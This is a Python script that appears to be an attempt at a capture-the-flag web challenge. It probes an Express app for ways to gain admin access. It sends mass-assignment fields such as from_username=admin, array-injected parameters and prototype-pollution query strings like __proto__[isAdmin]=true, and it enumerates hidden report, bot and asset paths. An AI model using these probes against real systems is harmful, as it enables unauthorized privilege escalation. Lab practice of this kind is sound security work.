import requests
import re

base = 'http://154.57.164.80:31506'

# Let me try a completely different approach
# Maybe the vulnerability is in how the Express app handles the form data
# Express body-parser can handle arrays: username[]=value

s = requests.Session()
s.post(f'{base}/login', data={'username': 'testuser1', 'password': 'testpass123'})

# 1. Try sending extra fields that might manipulate the message
print("=== EXTRA FIELDS IN MESSAGE SEND ===")
extra_payloads = [
    {'to_username': 'testuser1', 'content': 'test', 'from_username': 'admin'},
    {'to_username': 'testuser1', 'content': 'test', 'sender': 'admin'},
    {'to_username': 'testuser1', 'content': 'test', 'id': '1'},
    {'to_username': 'testuser1', 'content': 'test', 'to_id': '1'},  
    {'to_username[]': ['testuser1', 'admin'], 'content': 'test_array'},
]
for payload in extra_payloads:
    r = s.post(f'{base}/messages', data=payload, allow_redirects=False)
    print(f"  {list(payload.keys())}: status={r.status_code}")

# 2. Maybe there's a report/contact feature to trigger admin bot
print("\n=== LOOKING FOR REPORT/BOT TRIGGER ===")
report_paths = [
    '/report', '/report/', '/api/report', 
    '/support', '/contact', '/feedback',
    '/messages/report', '/report-message',
    '/bot/visit', '/trigger',
]
for path in report_paths:
    for method in ['GET', 'POST']:
        r = s.request(method, f'{base}{path}', allow_redirects=False)
        if r.status_code not in (404,):
            print(f"  {method} {path}: status={r.status_code}")
            if r.status_code == 200:
                print(f"    Body: {r.text[:300]}")

# 3. Check styles.css for any hints about hidden features
r = s.get(f'{base}/assets/styles.css')
print(f"\n=== STYLES.CSS ===")
print(r.text[:2000])

# 4. Check if there are other asset files
print("\n=== OTHER ASSETS ===")
asset_files = [
    '/assets/app.js', '/assets/main.js', '/assets/script.js',
    '/assets/admin.js', '/assets/login.js', '/assets/register.js',
    '/assets/inbox.js', '/assets/raven.png',
    '/favicon.ico', '/assets/ink-pot.png',
]
for path in asset_files:
    r = s.get(f'{base}{path}', allow_redirects=False)
    if r.status_code == 200:
        content_type = r.headers.get('Content-Type', '')
        print(f"  {path}: exists ({content_type}, {len(r.text)} bytes)")
        if 'javascript' in content_type or path.endswith('.js'):
            print(f"    Content: {r.text[:500]}")

# 5. Try to see nginx configuration leaks
r = s.get(f'{base}/nginx.conf', allow_redirects=False)
if r.status_code != 404:
    print(f"\n/nginx.conf: {r.status_code}")

# 6. Maybe the challenge has a different second port?
# Check if there's anything useful about the hint in the page
print("\n=== LOOKING AT ALL RESPONSE HEADERS CAREFULLY ===")
r = s.get(f'{base}/')
for k, v in r.headers.items():
    print(f"  {k}: {v}")

# 7. Try prototype pollution via Express query string parsing
print("\n=== QUERY STRING PROTOTYPE POLLUTION ===")
pp_urls = [
    f'{base}/login?__proto__[isAdmin]=true',
    f'{base}/?__proto__[role]=admin',
    f'{base}/login?constructor[prototype][isAdmin]=true',
]
for url in pp_urls:
    r = s.get(url, allow_redirects=False)
    print(f"  {url.split(base)[1]}: status={r.status_code}")
